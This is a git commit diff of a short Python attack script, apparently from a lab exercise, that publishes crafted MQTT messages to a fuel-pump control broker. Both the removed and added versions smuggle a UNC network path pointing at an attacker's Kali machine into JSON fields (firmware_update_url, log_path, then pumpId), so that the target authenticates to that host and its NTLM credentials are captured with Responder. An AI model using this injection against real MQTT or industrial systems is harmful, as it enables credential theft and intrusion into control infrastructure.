4c05fe4ed6c65ac2944d7ffd36ba82f6cd3f9457
Alef Santos <167534821+alefkaue@users.noreply.github.com>
2026-06-07 02:31:35 -0300

    Update injetar_av.py

--- injetar_av.py
+++ injetar_av.py
@@ -2,19 +2,17 @@ import json
 import paho.mqtt.client as mqtt
 
 BROKER = "10.10.100.100"
-KALI_IP = "10.10.100.8" 
+KALI_IP = "10.10.100.8"
 
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.connect(BROKER, 1883, 60)
 
-# Exemplo de payload induzindo o sistema a carregar algo de um caminho de rede (UNC)
+# Mantendo a estrutura exata do JSON, mas alterando o valor do texto
 payload = {
-    "pumpId": "PUMP001",
-    "firmware_update_url": f"\\\\{KALI_IP}\\share\\update.bin",
-    "log_path": f"\\\\{KALI_IP}\\logs"
+    "pumpId": rf"\\{KALI_IP}\share\PUMP003",
+    "currentLevel": 5
 }
 
-# O tópico exato depende de qual variável o sistema lê para processar caminhos
-client.publish("fuel-pumps/config", json.dumps(payload))
-print("[+] Gatilho de autenticação enviado. Verifique o terminal do Responder!")
+client.publish("fuel-pumps/refill-request", json.dumps(payload))
+print("[+] Teste 1 enviado. Monitore o Responder!")
 client.disconnect()
